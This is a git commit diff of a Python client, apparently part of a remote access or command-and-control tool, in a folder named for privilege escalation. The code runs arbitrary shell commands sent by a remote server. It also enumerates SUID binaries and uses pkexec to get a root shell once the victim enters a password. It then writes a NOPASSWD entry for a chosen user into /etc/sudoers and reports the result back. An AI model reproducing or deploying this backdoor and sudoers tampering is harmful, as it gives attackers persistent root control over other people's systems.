d7cdca776101fd6746354f14943d5700b1d5dcba
Danupat Chainarong <125113738+danupat-chainarong@users.noreply.github.com>
2024-07-02 13:07:24 +0700

    clean priv_client

--- features/privilege_esc/target/real_client.py
+++ features/privilege_esc/target/real_client.py
@@ -45,54 +45,57 @@ def shell():
             if command.lower() == 'exit':
                 break
             elif command.lower() == 'test':
-                reliable_send("test...")
+                reliable_send(os.name)
 
             elif command.lower() == 'findsuid':
-
-                suid_files = []
-                suid_files = find_suid_binaries()
-                result =    f"This is all suid binaries => \n {suid_files}"
-                if "/usr/bin/pkexec" in suid_files:
-                    result = "Found pkexec!!!!!!\nYou can run ESCALATE\n================\n" + result
-
+                if os.name == 'posix':
+                    suid_files = []
+                    suid_files = find_suid_binaries()
+                    result =    f"This is all suid binaries => \n {suid_files}"
+                    if "/usr/bin/pkexec" in suid_files:
+                        result = "Found pkexec!!!!!!\nYou can run ESCALATE\n================\n" + result
+                else:
+                    result = "CAN'T FINE: this is not linux"
                 reliable_send(result)                        
 
             elif command.startswith("escalate"):
-                pkexec_command = "pkexec /bin/bash"
-                esc_process = subprocess.Popen(pkexec_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                # Start threads to read stdout and stderr
-                threading.Thread(target=read_stream, args=(esc_process.stdout,)).start()
-                threading.Thread(target=read_stream, args=(esc_process.stderr,)).start()
-                reliable_send("Privilege escalation to root shell started.")
+                reliable_send(os.name)
+                if os.name == 'posix':
+                    # Run pkexec /bin/bash to gain root shell
+                    pkexec_command = "pkexec /bin/bash"
+                    esc_process = subprocess.Popen(pkexec_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    
+                    # Start threads to read stdout and stderr
+                    threading.Thread(target=read_stream, args=(esc_process.stdout,)).start()
+                    threading.Thread(target=read_stream, args=(esc_process.stderr,)).start()
 
-                while True:
-                    reliable_send("Waiting user input PASS")
-                    time.sleep(1)
-                    esc_process.stdin.write("whoami".encode() + b'\n')
-                    esc_process.stdin.flush()
-                    try:
+                    # Check that user input password or not
+                    while True:
+                        reliable_send("Waiting user input PASS")
+                        time.sleep(1)
+                        esc_process.stdin.write("whoami".encode() + b'\n')
+                        esc_process.stdin.flush()
                         if read_stream_result == "root":
-                            reliable_send("DONE")
+                            reliable_send("USER has already input PASS")
                             break
-                    except:
-                        print("--> error")
-                        continue
+                        
                     
-                
-                if esc_process:
-                    # Send command to the pkexec esc_process
-                    user = command[9:]
-                    esc_command = f'echo "{user} ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers_entry\ncat /tmp/sudoers_entry >> /etc/sudoers'
-                    esc_process.stdin.write(esc_command.encode() + b'\n')
-                    esc_process.stdin.flush()   
-                    
-                    #send the result of sudo -l
-                    execute = subprocess.Popen("sudo -l", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    result = execute.stdout.read() + execute.stderr.read()
-                    result = result.decode()
-                    reliable_send(result)
+                    if esc_process:
+                        # Send command for escalate specfic user to esc_process
+                        user = command[9:] #Define user from server input
+                        esc_command = f'echo "{user} ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers_entry\ncat /tmp/sudoers_entry >> /etc/sudoers'
+                        esc_process.stdin.write(esc_command.encode() + b'\n')
+                        esc_process.stdin.flush()
+                        time.sleep(2)
+                        
+                        #send the result of sudo -l
+                        execute = subprocess.Popen("sudo -l", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        result = execute.stdout.read() + execute.stderr.read()
+                        result = result.decode()
+                        result = "ESCALATION DONE\n\n" + result
+                        reliable_send(result)
 
-                    # threading.Thread(target=check_non_output_command, args=(esc_process,command)).start()
+                        # threading.Thread(target=check_non_output_command, args=(esc_process,command)).start()
             else:
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 result = execute.stdout.read() + execute.stderr.read()
